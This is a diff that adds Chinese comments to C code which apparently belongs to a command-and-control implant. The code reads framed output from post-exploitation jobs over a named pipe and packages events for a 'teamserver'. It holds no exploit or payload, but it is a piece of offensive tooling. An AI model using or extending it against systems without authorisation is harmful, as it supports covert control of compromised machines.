@@ -1,5 +1,6 @@
 #include "postex_internal.h"
 
+/* 从 little-endian 字节序读取 32 位整数。 */
 static UINT32 ReadLe32(const BYTE8* p)
 {
     return ((UINT32)p[0]) |
@@ -8,6 +9,7 @@ static UINT32 ReadLe32(const BYTE8* p)
            ((UINT32)p[3] << 24);
 }
 
+/* 判断 frame 类型是否允许直接转发给 teamserver。 */
 static BOOL PostExForwardableFrameType(UINT32 type)
 {
     return type == POSTEX_FRAME_TYPE_ERROR ||
@@ -16,6 +18,7 @@ static BOOL PostExForwardableFrameType(UINT32 type)
            type == POSTEX_FRAME_TYPE_ARTIFACT;
 }
 
+/* 从 PostEx pipe 中读取一个完整 frame，并转换为 poll 层返回码。 */
 static INT PostExReadFrameMode(PostExJob* job, ByteBuf* out,
                                CHAR* done_reason, SIZE_T done_reason_size,
                                UINT32* frame_type, UINT32* frame_flags,
@@ -38,6 +41,7 @@ static INT PostExReadFrameMode(PostExJob* job, ByteBuf* out,
     if (frame_flags) *frame_flags = 0;
     if (frame_seq) *frame_seq = 0;
 
+    /* 先 peek header，避免半包时阻塞 ReadFile。 */
     if (!PeekNamedPipe(job->pipe, NULL, 0, NULL, &avail, NULL)) return POSTEX_READ_CLOSED;
     if (avail < sizeof(hdr)) return POSTEX_READ_NONE;
 
@@ -63,6 +67,8 @@ static INT PostExReadFrameMode(PostExJob* job, ByteBuf* out,
     if (avail < sizeof(hdr) + length) {
         return POSTEX_READ_NONE;
     }
+
+    /* 完整 frame 已到达，正式消费 header 和 payload。 */
     if (!PostExReadExact(job->pipe, hdr, sizeof(hdr))) {
         return POSTEX_READ_CLOSED;
     }
@@ -75,6 +81,7 @@ static INT PostExReadFrameMode(PostExJob* job, ByteBuf* out,
         payload.len = length;
     }
 
+    /* DONE frame 只携带结束原因，不再作为普通输出上报。 */
     if (type == POSTEX_FRAME_TYPE_DONE) {
         if (done_reason && done_reason_size) {
             if (payload.len) {
@@ -90,6 +97,7 @@ static INT PostExReadFrameMode(PostExJob* job, ByteBuf* out,
         return POSTEX_READ_DONE;
     }
 
+    /* TEXT frame 兼容旧输出通道，直接转成 POSTEX_EVENT_OUTPUT。 */
     if (type == POSTEX_FRAME_TYPE_TEXT) {
         if (payload.len && !BbAppend(out, payload.data, payload.len)) {
             BbFree(out);
@@ -100,6 +108,7 @@ static INT PostExReadFrameMode(PostExJob* job, ByteBuf* out,
         return POSTEX_READ_OUTPUT;
     }
 
+    /* 其他允许转发的结构化 frame 保留 type/flags/seq。 */
     if (!PostExForwardableFrameType(type)) {
         BbFree(&payload);
         return POSTEX_READ_CLOSED;
@@ -117,6 +126,7 @@ static INT PostExReadFrameMode(PostExJob* job, ByteBuf* out,
     return POSTEX_READ_FRAME;
 }
 
+/* 读取 PostEx 子进程输出或结构化 frame。 */
 INT PostExReadOutput(PostExJob* job, ByteBuf* out,
                      CHAR* done_reason, SIZE_T done_reason_size,
                      UINT32* frame_type, UINT32* frame_flags,
@@ -126,6 +136,7 @@ INT PostExReadOutput(PostExJob* job, ByteBuf* out,
                                frame_type, frame_flags, frame_seq);
 }
 
+/* 构建 PostEx 文本输出事件。 */
 ByteBuf PostExMakeOutput(PostExJob* job, const ByteBuf* data)
 {
     ByteBuf payload;
@@ -142,6 +153,7 @@ ByteBuf PostExMakeOutput(PostExJob* job, const ByteBuf* data)
     return final;
 }
 
+/* 构建 PostEx 结束事件。 */
 ByteBuf PostExMakeDead(PostExJob* job, const CHAR* reason)
 {
     ByteBuf payload;
@@ -158,6 +170,7 @@ ByteBuf PostExMakeDead(PostExJob* job, const CHAR* reason)
     return final;
 }
 
+/* 构建 PostEx 结构化 frame 事件。 */
 ByteBuf PostExMakeFrame(PostExJob* job, UINT32 frame_type,
                         UINT32 frame_flags, UINT32 frame_seq,
                         const ByteBuf* data)
